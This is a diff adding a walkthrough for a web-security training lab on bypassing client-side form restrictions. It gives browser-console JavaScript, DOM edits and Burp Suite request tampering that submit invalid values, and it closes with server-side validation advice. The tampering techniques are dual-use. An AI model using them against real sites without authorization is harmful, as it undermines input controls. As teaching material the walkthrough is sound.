@@ -1,0 +1,179 @@
+====================================
+CLIENT-SIDE BYPASS CHALLENGE
+====================================
+
+CHALLENGE: Bypass all client-side input restrictions
+
+RESTRICTIONS TO BYPASS:
+1. Select field - Limited to "option1" or "option2"
+2. Radio button - Limited to "option1" or "option2"  
+3. Checkbox - Either on or off
+4. Short input - Maxlength of 5 characters
+5. Readonly input - Cannot be edited
+
+GOAL: Submit values that violate these restrictions!
+
+====================================
+ATTACK STRATEGY
+====================================
+
+The restrictions are CLIENT-SIDE ONLY!
+- They exist in HTML/JavaScript
+- The SERVER may not validate them
+- We can manipulate before sending
+
+====================================
+METHOD 1: BROWSER CONSOLE (EASIEST)
+====================================
+
+1. Open the lesson page in browser
+2. Press F12 → Console tab
+3. Run this JavaScript:
+
+// Bypass all restrictions
+document.querySelector('select[name="select"]').value = 'option3';
+document.querySelector('input[name="radio"]:checked').value = 'option3';
+document.querySelector('input[name="checkbox"]').value = 'different';
+document.querySelector('input[name="shortInput"]').value = 'thisIsLongerThan5Characters';
+document.querySelector('input[name="readOnlyInput"]').value = 'hacked';
+
+// Submit the form
+document.querySelector('form[name="fieldRestrictions"]').submit();
+
+4. Watch for success message!
+
+====================================
+METHOD 2: POWERSHELL ATTACK
+====================================
+
+Use the PowerShell script:
+.\bypass_field_restrictions.ps1
+
+This sends POST request with bypassed values:
+- select=option3 (invalid option)
+- radio=option3 (invalid option)
+- checkbox=different (unexpected value)
+- shortInput=thisIsLongerThan5Characters (exceeds maxlength)
+- readOnlyInput=hacked (readonly bypassed)
+
+====================================
+METHOD 3: BROWSER DEV TOOLS
+====================================
+
+1. Open the form page
+2. Press F12 → Elements/Inspector
+3. Find each input field
+4. Edit the HTML directly:
+
+For SELECT:
+<select name="select">
+    <option value="option1">Option 1</option>
+    <option value="option2">Option 2</option>
+    <option value="option3" selected>Option 3</option>  ← ADD THIS
+</select>
+
+For RADIO:
+Change: value="option1" → value="option3"
+
+For SHORT INPUT:
+Remove: maxlength="5"
+Then type longer text
+
+For READONLY:
+Remove: readonly="readonly"
+Then edit the value
+
+5. Click Submit button
+
+====================================
+METHOD 4: INTERCEPT WITH BURP SUITE
+====================================
+
+1. Set up Burp proxy (see BURP_SUITE_SETUP_GUIDE.txt)
+2. Turn on Intercept
+3. Fill form normally and click Submit
+4. In Burp, modify the POST data:
+
+Original:
+select=option1&radio=option1&checkbox=on&shortInput=12345&readOnlyInput=change
+
+Change to:
+select=option3&radio=option3&checkbox=different&shortInput=thisIsLongerThan5Characters&readOnlyInput=hacked
+
+5. Forward the request
+
+====================================
+EXPECTED VALUES TO BYPASS
+====================================
+
+Field: select
+Valid: option1, option2
+Attack: option3, hack, admin, 999
+
+Field: radio
+Valid: option1, option2
+Attack: option3, both, none
+
+Field: checkbox
+Valid: on (checked), missing (unchecked)
+Attack: off, different, yes, true
+
+Field: shortInput
+Valid: 5 characters max (12345)
+Attack: thisIsLongerThan5Characters, 1234567890
+
+Field: readOnlyInput
+Valid: "change" (readonly)
+Attack: hacked, modified, pwned
+
+====================================
+WHY THIS WORKS
+====================================
+
+Client-side validation is NOT security!
+
+1. HTML attributes (maxlength, readonly) can be removed
+2. JavaScript validation can be disabled
+3. HTTP requests can be crafted directly
+4. Browser dev tools can modify DOM
+5. Proxies can intercept and modify requests
+
+DEFENSE: ALWAYS validate on the server!
+
+====================================
+SECURITY LESSONS
+====================================
+
+❌ DON'T RELY ON:
+- HTML input restrictions (maxlength, min, max, pattern)
+- Readonly/disabled attributes
+- JavaScript validation
+- Hidden fields
+- Select/radio limited options
+- Client-side anything!
+
+✅ DO THIS INSTEAD:
+- Server-side validation (always!)
+- Whitelist allowed values
+- Check length/format on server
+- Never trust client data
+- Validate every parameter
+- Use proper authorization
+
+====================================
+QUICK REFERENCE
+====================================
+
+Browser Console Command (Copy/Paste):
+───────────────────────────────────────
+document.querySelector('select[name="select"]').value = 'option3';
+document.querySelector('input[name="radio"]:checked').value = 'option3';
+document.querySelector('input[name="checkbox"]').value = 'different';
+document.querySelector('input[name="shortInput"]').value = 'thisIsLongerThan5Characters';
+document.querySelector('input[name="readOnlyInput"]').value = 'hacked';
+document.querySelector('form[name="fieldRestrictions"]').submit();
+
+Or run:
+.\bypass_field_restrictions.ps1
+
+====================================
